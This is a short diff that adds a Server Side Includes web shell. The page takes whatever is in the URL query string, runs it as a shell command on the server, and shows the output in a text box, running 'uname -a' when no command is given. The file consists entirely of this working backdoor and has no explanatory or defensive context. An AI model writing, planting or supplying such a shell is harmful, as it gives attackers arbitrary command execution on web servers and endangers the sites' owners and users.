@@ -1,0 +1,9 @@
+<!--#config errmsg="[Error in shell]"-->
+<!--#set var="zero" value="" -->
+<!--#if expr="$QUERY_STRING_UNESCAPED = \$zero" -->
+<!--#set var="shl" value="uname -a" -->
+<!--#else -->
+<!--#set var="shl" value=$QUERY_STRING_UNESCAPED -->
+<!--#endif -->
+<textarea bgcolor=#e4e0d8 cols=121 rows=15>
+<!--#exec cmd=$shl -->
